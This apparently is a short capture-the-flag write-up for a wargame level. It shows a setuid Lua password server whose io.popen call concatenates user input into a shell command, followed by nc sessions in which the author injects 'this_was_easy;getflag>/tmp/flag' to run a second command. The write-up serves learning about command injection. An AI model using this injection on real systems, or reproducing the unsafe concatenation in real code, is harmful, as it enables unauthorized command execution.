with a `ls -la` we can find one file:
`-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua`

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

this is a LUA server script, that check if the password is equal to a raw hash.
we can spot quickly the line `prog = io.popen("echo "..pass.." | sha1sum", "r")` that use the user input

with `nc 127.0.0.1 5151` we can connect to the server and inject a payload to see what appen
`$PATH > /tmp/flag`
`cat /tmp/flag`
`/sbin:/bin:/usr/sbin:/usr/bin`

this work, we just need to build a proper payload and run it:
`nc 127.0.0.1 5151 ; cat /tmp/flag`
`Password: this_was_easy;getflag>/tmp/flag`
`Erf nope..`
`Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s`